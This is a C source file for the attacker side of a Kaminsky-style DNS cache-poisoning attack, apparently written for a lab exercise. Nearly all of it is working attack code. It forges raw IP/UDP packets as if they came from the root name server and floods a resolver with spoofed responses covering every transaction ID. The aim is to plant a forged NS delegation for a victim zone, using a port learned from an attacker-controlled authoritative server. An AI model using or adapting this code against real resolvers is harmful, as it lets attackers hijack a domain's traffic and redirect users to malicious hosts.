/*
 * poison_client.c
 *
 * Attacker client driver for a Kaminsky-style DNS cache-poisoning attack.
 *
 * Flow:
 *   1. Send a trigger query to the resolver for a name in the attacker's own
 *      zone. The resolver recurses to the attacker's authoritative server,
 *      which observes the resolver's UDP source port.
 *   2. Fetch that port from the authoritative server over the TCP control
 *      channel.
 *   3. For each round, query the resolver for a fresh non-cached subdomain of
 *      the victim zone and, while the query is outstanding, flood the resolver
 *      with spoofed responses forged from the root server IP, covering the full
 *      16-bit TXID space. A spoofed packet whose TXID matches the resolver's
 *      outstanding query wins the race and poisons the cache with a forged NS
 *      delegation for the victim zone.
 *
 * The program produces no output.
 */

#include "lab_config.h"
#include "net_util.h"
#include "control_channel.h"
#include "raw_packet.h"
#include "spoof_dns.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define IP_UDP_FRAME_MAX_SIZE 1500U

/*
 * One attack round: build the spoofed response once, then for every possible
 * TXID patch it into the wire buffer and inject the frame to the resolver.
 */
static void flood_spoofed_responses(uint16_t resolver_port,
                                    const char *subdomain_name)
{
    if (subdomain_name == NULL) {
        return;
    }

    struct sockaddr_in resolver_addr;
    int sockfd = open_raw_udp_socket(&resolver_addr, RESOLVER_IP_STRING, resolver_port);
    if (sockfd < 0) {
        return;
    }

    uint8_t *dns_payload = NULL;
    size_t dns_len = 0U;
    if (!build_spoofed_response(subdomain_name, &dns_payload, &dns_len) ||
        dns_len < 2U) {
        free(dns_payload);
        (void)close(sockfd);
        return;
    }

    struct in_addr src_ip_addr;
    struct in_addr dst_ip_addr;
    if (!ipv4_from_string(ROOT_NS_IP_STRING, &src_ip_addr) ||
        !ipv4_from_string(RESOLVER_IP_STRING, &dst_ip_addr)) {
        free(dns_payload);
        (void)close(sockfd);
        return;
    }

    const size_t ip_len = sizeof(struct IPv4Header);
    const size_t udp_len = sizeof(struct UdpHeader);

    struct IPv4Header ip_template;
    memset(&ip_template, 0, sizeof(ip_template));
    ip_template.version_ihl    = 0x45U; /* IPv4, 20-byte header */
    ip_template.total_length   = htons((uint16_t)(ip_len + udp_len + dns_len));
    ip_template.identification = htons(0x1234U);
    ip_template.flags_fragment = htons(0x4000U); /* Don't Fragment */
    ip_template.ttl            = 64U;
    ip_template.protocol       = 17U; /* UDP */
    ip_template.src_ip         = src_ip_addr.s_addr;
    ip_template.dst_ip         = dst_ip_addr.s_addr;
    ip_template.checksum       = htons(ip_checksum(&ip_template));

    for (uint32_t txid = 0U; txid < MAX_TXID_SPACE; ++txid) {
        /* Patch the 16-bit TXID into the DNS header (first two bytes). */
        dns_payload[0] = (uint8_t)((txid >> 8) & 0xFFU);
        dns_payload[1] = (uint8_t)(txid & 0xFFU);

        uint8_t frame[IP_UDP_FRAME_MAX_SIZE];
        size_t frame_len = build_udp_ip_frame(
            frame, sizeof(frame), &ip_template,
            (uint16_t)DNS_PORT, /* forged source: the root NS */
            resolver_port,      /* destination: the resolver  */
            dns_payload, dns_len);
        if (frame_len == 0U) {
            continue;
        }

        (void)sendto(sockfd, frame, frame_len, 0,
                     (const struct sockaddr *)&resolver_addr,
                     (socklen_t)sizeof(resolver_addr));
    }

    free(dns_payload);
    (void)close(sockfd);
}

/*
 * Full attack: for each round generate a fresh subdomain of the victim zone,
 * send one real query, then flood spoofed responses across the TXID space.
 */
static void run_attack(uint16_t resolver_port)
{
    if (resolver_port == 0U) {
        return;
    }

    for (uint32_t round = 1U; round <= MAX_ATTACK_ROUNDS; ++round) {
        char subdomain[256];
        int n = snprintf(subdomain, sizeof(subdomain), "ww%u.%s",
                         round, TARGET_BASE_DOMAIN);
        if (n <= 0 || (size_t)n >= sizeof(subdomain)) {
            continue;
        }
        send_a_query_to_resolver(subdomain);
        flood_spoofed_responses(resolver_port, subdomain);
    }
}

int main(void)
{
    /* Trigger query so the authoritative server learns the resolver's port. */
    send_a_query_to_resolver(ATTACKER_WWW_NAME);

    uint16_t resolver_port =
        control_fetch_port(ATTACKER_AUTH_IP_STRING, (uint16_t)CONTROL_TCP_PORT);

    run_attack(resolver_port);
    return 0;
}
